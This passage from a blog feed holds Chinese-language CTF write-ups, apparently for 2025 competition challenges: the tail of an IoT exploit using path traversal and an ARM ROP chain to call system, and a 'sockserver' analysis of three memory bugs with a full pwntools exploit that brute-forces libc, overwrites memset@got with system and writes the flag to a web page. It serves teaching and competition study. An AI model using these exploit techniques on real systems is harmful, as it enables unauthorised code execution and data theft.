class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_publicfile</span>(<span class="params">cnt1, cnt2</span>):</span><br><span class="line">    url = <span class="string">f&quot;http://<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>/cgi-bin/manage.cgi&quot;</span></span><br><span class="line">    <span class="comment"># print(url)</span></span><br><span class="line">    resp = session.post(url, data=&#123;<span class="string">&quot;action&quot;</span>: <span class="string">&quot;set_publicfile&quot;</span>, <span class="string">&quot;cnt1&quot;</span>: cnt1, <span class="string">&quot;cnt2&quot;</span>: cnt2&#125;)</span><br><span class="line">    <span class="comment"># print(resp.text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">root_function</span>(<span class="params">root_key</span>):</span><br><span class="line">    url = <span class="string">f&quot;http://<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>/cgi-bin/manage.cgi&quot;</span></span><br><span class="line">    <span class="comment"># print(url)</span></span><br><span class="line">    resp = session.post(url, data=&#123;<span class="string">&quot;rk&quot;</span>: root_key&#125;)</span><br><span class="line">    <span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logs</span>():</span><br><span class="line">    url = <span class="string">f&quot;http://<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>/cgi-bin/manage.cgi&quot;</span></span><br><span class="line">    <span class="comment"># print(url)</span></span><br><span class="line">    resp = session.post(url, data=&#123;<span class="string">&quot;action&quot;</span>: <span class="string">&quot;logs&quot;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">login(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;8g323##a08h33zx33@!B!$$$$$$$&quot;</span>)</span><br><span class="line">watch()</span><br><span class="line">root_key = download(<span class="string">&quot;./././././././././././././././././././././././././././././././././././././././././/rootkeynik.gif&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> root_key</span><br><span class="line"></span><br><span class="line">libc_addr = <span class="number">0xb6e8f000</span></span><br><span class="line">pop_lr = libc_addr + <span class="number">0x00015b24</span></span><br><span class="line">pop_r0_lr = libc_addr + <span class="number">0x0010c730</span></span><br><span class="line">system = libc_addr + <span class="number">0x38d34</span></span><br><span class="line">shm_addr = <span class="number">0xb6ffc000</span></span><br><span class="line">payload = <span class="string">b&quot;\x7f&quot;</span> + cyclic(<span class="number">0x23</span>)</span><br><span class="line">payload += p32(pop_r0_lr)</span><br><span class="line">payload += p32(shm_addr + <span class="number">0x24</span> + <span class="number">0x4</span> * <span class="number">3</span>)</span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += <span class="string">b&quot;cat /home/ctf/flag &gt; /tmp/store/logs.txt\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> idx, val <span class="keyword">in</span> <span class="built_in">enumerate</span>(payload):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;set <span class="subst">&#123;<span class="built_in">hex</span>(idx)&#125;</span> -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(val)[<span class="number">2</span>:]&#125;</span>&quot;</span>)</span><br><span class="line">    upload_pubkey(<span class="string">&quot;00&quot;</span> * <span class="number">80</span> + <span class="built_in">hex</span>(val)[<span class="number">2</span>:])</span><br><span class="line">    set_publicfile(<span class="number">80</span>, idx)</span><br><span class="line"></span><br><span class="line">id_save(<span class="string">&quot;-1&quot;</span>)</span><br><span class="line">root_function(root_key)</span><br><span class="line"><span class="comment"># logs()</span></span><br></pre></td></tr></table></figure><p>因为调用 root_key 之后，函数无法正常返回，reqests 会一直等待响应，所以需要单独 logs 函数，获取 flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">login(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;8g323##a08h33zx33@!B!$$$$$$$&quot;</span>)</span><br><span class="line">logs()</span><br></pre></td></tr></table></figure><p><img src="/2025/10/29/2025-qwnt-quals-iot1-wp/.././2025-qwnt-quals-iot1-wp/image-20251101182405897.png" alt="image-20251101182405897"></p><h1 id="Poor-communication-protocol"><a href="#Poor-communication-protocol" class="headerlink" title="Poor communication protocol"></a>Poor communication protocol</h1><p>文章发布于看雪论坛：<a href="https://bbs.kanxue.com/thread-288962.htm">[原创]利用 AI 复现 2025 强网拟态初赛 2 解 IoT 题目：Poor communication protocol</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;题目分析&quot;&gt;&lt;a href=&quot;#题目分析&quot; class=&quot;headerlink&quot; title=&quot;题目分析&quot;&gt;&lt;/a&gt;题目分析&lt;/h1&gt;&lt;p&gt;启动脚本只开放了一个 80 端口&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr</summary>
      
    
    
    
    <category term="Write Up" scheme="https://the-soloist.github.io/category/Write-Up/"/>
    
    
    <category term="CTF" scheme="https://the-soloist.github.io/tag/CTF/"/>
    
  </entry>
  
  <entry>
    <title>第九届“强网杯”全国网络安全挑战赛 初赛 Write Up：sockserver</title>
    <link href="https://the-soloist.github.io/2025/10/20/2025-qwb-quals-pwn1-wp/"/>
    <id>https://the-soloist.github.io/2025/10/20/2025-qwb-quals-pwn1-wp/</id>
    <published>2025-10-19T16:50:23.000Z</published>
    <updated>2025-12-17T15:05:33.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><blockquote><p>函数名是 ai 恢复的，不过不影响看</p></blockquote><p>题目实现了一个 sock server，每接收到一个连接，就会创建对应的 thread，routine 函数是 client_session_thread</p><p><img src="/2025/10/20/2025-qwb-quals-pwn1-wp/.././2025-qwb-quals-pwn1-wp/image-20251029235234027.png" alt="image-20251029235234027"></p><p>实现了 5 个功能，add、delete、proxy（6 和 default 没用）。并且题目管理了一个全局的 heap_idx 结构体，用于计算数组的偏移和当前数量。</p><p><img src="/2025/10/20/2025-qwb-quals-pwn1-wp/.././2025-qwb-quals-pwn1-wp/image-20251029235240077.png" alt="image-20251029235240077"></p><p><img src="/2025/10/20/2025-qwb-quals-pwn1-wp/.././2025-qwb-quals-pwn1-wp/image-20251029235247518.png" alt="image-20251029235247518"></p><p>还给了一个 flask 实现的 webserver，并且能访问的是白名单 index.html 和 flag.html，容器只给了一个 index，所以猜测 flag 是后续利用漏洞需要的</p><p><img src="/2025/10/20/2025-qwb-quals-pwn1-wp/.././2025-qwb-quals-pwn1-wp/image-20251030213304806.png" alt="image-20251030213304806"></p><h2 id="漏洞一"><a href="#漏洞一" class="headerlink" title="漏洞一"></a>漏洞一</h2><p>漏洞点出在 delete 函数，这里是先<code>--heap_idx-&gt;list_num</code>然后才判断 chunk 是否存在，如果不存在也不会恢复<code>heap_idx-&gt;list_num</code></p><p><img src="/2025/10/20/2025-qwb-quals-pwn1-wp/.././2025-qwb-quals-pwn1-wp/image-20251029235413149.png" alt="image-20251029235413149"></p><p>而 add 功能中会先判断<code>heap_idx-&gt;list_num &lt;= 100</code>，然后把 heao 指针保存在<code>heap_list[heap_idx-&gt;list_idx]</code>。</p><p><img src="/2025/10/20/2025-qwb-quals-pwn1-wp/.././2025-qwb-quals-pwn1-wp/image-20251029235417050.png" alt="image-20251029235417050"></p><p>那么我们先填满 heap_list，再 delete 的时候释放一个不存在的 chunk，我们就可以实现数组溢出了，看一下 bss 段的内容，相邻的正好是 heap_idx</p><p><img src="/2025/10/20/2025-qwb-quals-pwn1-wp/.././2025-qwb-quals-pwn1-wp/image-20251029235421175.png" alt="image-20251029235421175"></p><h2 id="漏洞二"><a href="#漏洞二" class="headerlink" title="漏洞二"></a>漏洞二</h2><p>第二个漏洞回到 main 函数，<code>heap_idx-&gt;index &lt;= 100</code>是有符号比较，检查通过后执行<code>dword_405480[heap_idx-&gt;index - 1] = ++heap_idx-&gt;value</code>，如果<code>heap_idx-&gt;index</code>可控，就可以实现负数溢出</p><p><img src="/2025/10/20/2025-qwb-quals-pwn1-wp/.././2025-qwb-quals-pwn1-wp/image-20251029235431849.png" alt="image-20251029235431849"></p><h2 id="漏洞三"><a href="#漏洞三" class="headerlink" title="漏洞三"></a>漏洞三</h2><p>find_chunk 判断 chunk 是否存在，比较方法使用的是 bytes_equal，函数只会匹配到输入数据的长度，并且会被 00 截断</p><p><img src="/2025/10/20/2025-qwb-quals-pwn1-wp/.././2025-qwb-quals-pwn1-wp/image-20251029235436249.png" alt="image-20251029235436249"></p><p><img src="/2025/10/20/2025-qwb-quals-pwn1-wp/.././2025-qwb-quals-pwn1-wp/image-20251029235438955.png" alt="image-20251029235438955"></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>利用思路：</p><p>根据上面的分析，我们可以通过漏洞一控制 heao_idx 结构体，然后利用漏洞二实现负数溢出能往 0x405480 之前的地址任意写入（每次 4 字节）。</p><p>0x405480 前面是 got 表，并且题目没有开随机化，所以可以把<code>free@got</code>的地址写入到<code>heap_list[0]</code>中，这样就是利用 find_chunk 爆破 libc 地址</p><p><img src="/2025/10/20/2025-qwb-quals-pwn1-wp/.././2025-qwb-quals-pwn1-wp/image-20251029235443520.png" alt="image-20251029235443520"></p><p>拿到 libc 地址后，因为 routine 函数结束的时候也调用了 free，所以不能直接改 free@got</p><p><img src="/2025/10/20/2025-qwb-quals-pwn1-wp/.././2025-qwb-quals-pwn1-wp/image-20251029235446858.png" alt="image-20251029235446858"></p><p>proxy 功能的 socks5_handle_connect 函数解析失败的时候会调用 memset 拷贝 error msg，而这个函数没有其他地方调用了，因此可以将 memset@got 改成 system</p><p><img src="/2025/10/20/2025-qwb-quals-pwn1-wp/.././2025-qwb-quals-pwn1-wp/image-20251029235450370.png" alt="image-20251029235450370"></p><p><img src="/2025/10/20/2025-qwb-quals-pwn1-wp/.././2025-qwb-quals-pwn1-wp/image-20251029235457574.png" alt="image-20251029235457574"></p><p>执行<code>system(&quot;cat /flag &gt; ./web/flag.html&quot;)</code>后，利用 proxy 的功能访问内网端口获取 flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwnkit <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> construct <span class="keyword">import</span> Struct, Switch, Byte, Bytes, Const, this, Pass, Rebuild, len_, Int16ub, Adapter</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">args = init_pwn_args()</span><br><span class="line">binary = ELF(<span class="string">&quot;./sockserver&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">args.info.binary = context.binary = binary</span><br><span class="line">args.info.target = &#123;<span class="string">&quot;host&quot;</span>: args.host, <span class="string">&quot;port&quot;</span>: args.port&#125;</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">1080</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; &gt;&gt;&gt; exploit goes here &lt;&lt;&lt; &quot;&quot;&quot;</span></span><br><span class="line">srv = pwntube(args) <span class="keyword">if</span> <span class="keyword">not</span> args.remote <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Inet4Adapter</span>(<span class="title class_ inherited__">Adapter</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;把 4 字节的 IPv4 与点分十进制字符串互转&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_encode</span>(<span class="params">self, obj, context, path</span>):</span><br><span class="line">        <span class="comment"># 接受 &quot;127.0.0.1&quot; 或 b&quot;\x7f\x00\x00\x01&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, (<span class="built_in">bytes</span>, <span class="built_in">bytearray</span>)):</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">bytes</span>(obj)</span><br><span class="line">        <span class="keyword">return</span> socket.inet_aton(obj)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_decode</span>(<span class="params">self, obj, context, path</span>):</span><br><span class="line">        <span class="keyword">return</span> socket.inet_ntoa(obj)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PackCMD = Struct(</span><br><span class="line">    <span class="string">&quot;magic&quot;</span> / Const(<span class="number">5</span>, Byte),</span><br><span class="line">    <span class="string">&quot;size&quot;</span> / Byte,</span><br><span class="line">    <span class="string">&quot;data&quot;</span> / Byte[this.size],</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">PackConnect = Struct(</span><br><span class="line">    <span class="string">&quot;magic1&quot;</span> / Const(<span class="number">5</span>, Byte),      <span class="comment"># must be 0x05</span></span><br><span class="line">    <span class="string">&quot;magic2&quot;</span> / Const(<span class="number">1</span>, Byte),      <span class="comment"># must be 0x01 CONNECT (your C code checks this)</span></span><br><span class="line">    <span class="string">&quot;magic3&quot;</span> / Const(<span class="number">0</span>, Byte),</span><br><span class="line">    <span class="string">&quot;addr_type&quot;</span> / Byte,</span><br><span class="line">    <span class="string">&quot;bind_addr&quot;</span> / Switch(this.addr_type, &#123;</span><br><span class="line">        <span class="number">1</span>: Struct(                       <span class="comment"># IPv4: 4 bytes addr + 2 bytes port</span></span><br><span class="line">            <span class="string">&quot;ipv4&quot;</span> / Inet4Adapter(Bytes(<span class="number">4</span>)),</span><br><span class="line">            <span class="string">&quot;port&quot;</span> / Int16ub,</span><br><span class="line">        ),</span><br><span class="line">        <span class="number">3</span>: Struct(                       <span class="comment"># DOMAIN: 1-byte len, domain bytes, 2 bytes port</span></span><br><span class="line">            <span class="string">&quot;domain_len&quot;</span> / Rebuild(Byte, len_(this.domain)),</span><br><span class="line">            <span class="string">&quot;domain&quot;</span> / Bytes(this.domain_len),</span><br><span class="line">            <span class="string">&quot;port&quot;</span> / Int16ub,</span><br><span class="line">        ),</span><br><span class="line">    &#125;, default=Pass)  <span class="comment"># 如果遇到其他 addr_type，解析会落在 default（你也可以抛错）</span></span><br><span class="line">)</span><br><span class="line">MSG_0 = <span class="string">b&quot;\x05\x00&quot;</span></span><br><span class="line">MSG_1 = <span class="string">b&quot;\x05\x01&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_cmd</span>(<span class="params">p, cmd</span>):</span><br><span class="line">    p.send(PackCMD.build(&#123;</span><br><span class="line">        <span class="string">&quot;size&quot;</span>: <span class="built_in">len</span>(p8(cmd)),</span><br><span class="line">        <span class="string">&quot;data&quot;</span>: p8(cmd),</span><br><span class="line">    &#125;))</span><br><span class="line">    p.recvuntil(p8(<span class="number">0x05</span>) + p8(cmd))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">p, data</span>):</span><br><span class="line">    send_cmd(p, <span class="number">0x03</span>)</span><br><span class="line">    p.recvuntil(MSG_0)</span><br><span class="line">    p.send(data)</span><br><span class="line">    p.recvuntil(MSG_0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">p, data</span>):</span><br><span class="line">    send_cmd(p, <span class="number">0x04</span>)</span><br><span class="line">    p.recvuntil(MSG_1)</span><br><span class="line">    p.send(data)</span><br><span class="line">    <span class="comment"># p.recvuntil(MSG_0)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_exit</span>(<span class="params">p</span>):</span><br><span class="line">    send_cmd(p, <span class="number">0x01</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write2addr</span>(<span class="params">p, addr, value</span>):</span><br><span class="line">    offset = ((addr - <span class="number">0x405480</span>) // <span class="number">4</span>) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    payload = p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">99</span>)</span><br><span class="line">    payload += p64((offset + <span class="number">1</span>) &amp; <span class="number">0xffffffffffffffff</span>)  <span class="comment"># heap_list[0]</span></span><br><span class="line">    payload += p64((value - <span class="number">1</span>) &amp; <span class="number">0xffffffffffffffff</span>)</span><br><span class="line">    add(p, payload)</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_idx</span>(<span class="params">p</span>):</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    payload = p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">99</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span> + <span class="number">1</span>)</span><br><span class="line">    payload += p64(<span class="number">1</span> - <span class="number">1</span>)</span><br><span class="line">    add(p, payload)</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_worker</span>(<span class="params">start, end</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">global</span> libc_leak</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end + <span class="number">1</span>):</span><br><span class="line">        <span class="comment"># 检查是否已经有其他线程找到了结果</span></span><br><span class="line">        <span class="keyword">if</span> found_flag.is_set():</span><br><span class="line">            log.info(<span class="string">f&quot;Thread <span class="subst">&#123;threading.current_thread().name&#125;</span> exiting early, result already found&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        p = remote(host, port)</span><br><span class="line">        send_cmd(p, <span class="number">0x05</span>)</span><br><span class="line">        p.recvuntil(MSG_1)</span><br><span class="line">        p.send(libc_leak + p8(i) + <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">        res = p.recv(<span class="number">2</span>)</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> res == MSG_0:</span><br><span class="line">            <span class="comment"># 使用锁保护共享变量</span></span><br><span class="line">            <span class="keyword">with</span> found_lock:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> found_flag.is_set():  <span class="comment"># 双重检查，确保只有一个线程处理结果</span></span><br><span class="line">                    log.success(<span class="string">f&quot;found byte of libc: <span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span>&quot;</span>)</span><br><span class="line">                    libc_leak += p8(i)</span><br><span class="line">                    found_flag.<span class="built_in">set</span>()  <span class="comment"># 设置标志，通知其他线程退出</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># fill heap list</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    add(p, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># global num-1</span></span><br><span class="line">p = remote(host, port)</span><br><span class="line">delete(p, <span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># write heap_list[0] to free@got</span></span><br><span class="line">write2addr(p, <span class="number">0x405140</span>, <span class="number">0x405018</span> + <span class="number">8</span>)</span><br><span class="line">write2addr(p, <span class="number">0x405144</span>, <span class="number">0</span>)</span><br><span class="line">clean_idx(p)</span><br><span class="line"></span><br><span class="line">libc_leak = <span class="built_in">bytes</span>(<span class="number">0</span>)</span><br><span class="line">found_lock = threading.Lock()</span><br><span class="line">found_flag = threading.Event()  <span class="comment"># 用于通知其他线程退出</span></span><br><span class="line"></span><br><span class="line">THREAD_NUM = <span class="number">15</span></span><br><span class="line">threads = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算每个线程处理的范围</span></span><br><span class="line">total_range = <span class="number">255</span>   <span class="comment"># 1到255，共255个数</span></span><br><span class="line">chunk_size = total_range // THREAD_NUM</span><br><span class="line">remainder = total_range % THREAD_NUM</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    found_flag.clear()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(THREAD_NUM):</span><br><span class="line">        <span class="comment"># 计算当前线程的起始和结束位置</span></span><br><span class="line">        start = <span class="number">1</span> + i * chunk_size + <span class="built_in">min</span>(i, remainder)</span><br><span class="line">        end = start + chunk_size - <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i &lt; remainder:  <span class="comment"># 前remainder个线程多分配一个数</span></span><br><span class="line">            end += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Thread <span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;start&#125;</span>-<span class="subst">&#123;end&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        thread = threading.Thread(target=brute_worker, args=(start, end), name=<span class="string">f&quot;BruteWorker-<span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">        threads.append(thread)</span><br><span class="line">        thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待所有线程完成，或者等待找到结果</span></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(libc_leak, <span class="built_in">len</span>(libc_leak))</span><br><span class="line"></span><br><span class="line">libc_leak = uu64(libc_leak)</span><br><span class="line">libc_base = libc_leak - libc.symbols[<span class="string">&quot;free&quot;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">plog.address(libc_base=libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write heap_list[0] to bin_sh_addr</span></span><br><span class="line">write2addr(p, <span class="number">0x405140</span>, bin_sh_addr &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">write2addr(p, <span class="number">0x405140</span> + <span class="number">4</span>, (bin_sh_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">clean_idx(p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write memset@got to system_addr</span></span><br><span class="line">write2addr(p, <span class="number">0x405058</span>, system_addr &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">write2addr(p, <span class="number">0x405058</span> + <span class="number">4</span>, (system_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">clean_idx(p)</span><br><span class="line"></span><br><span class="line">p = remote(host, port)</span><br><span class="line">send_cmd(p, <span class="number">0x05</span>)</span><br><span class="line">p.recvuntil(MSG_1)</span><br><span class="line">p.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)  <span class="comment"># for search</span></span><br><span class="line">payload = p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += <span class="string">b&quot;cat /flag &gt; ./web/flag.html&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line">p = remote(host, port)</span><br><span class="line">send_cmd(p, <span class="number">0x05</span>)</span><br><span class="line">p.recvuntil(MSG_1)</span><br><span class="line">p.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)  <span class="comment"># for search</span></span><br><span class="line">p.send(PackConnect.build(&#123;</span><br><span class="line">    <span class="string">&quot;addr_type&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;bind_addr&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;ipv4&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">        <span 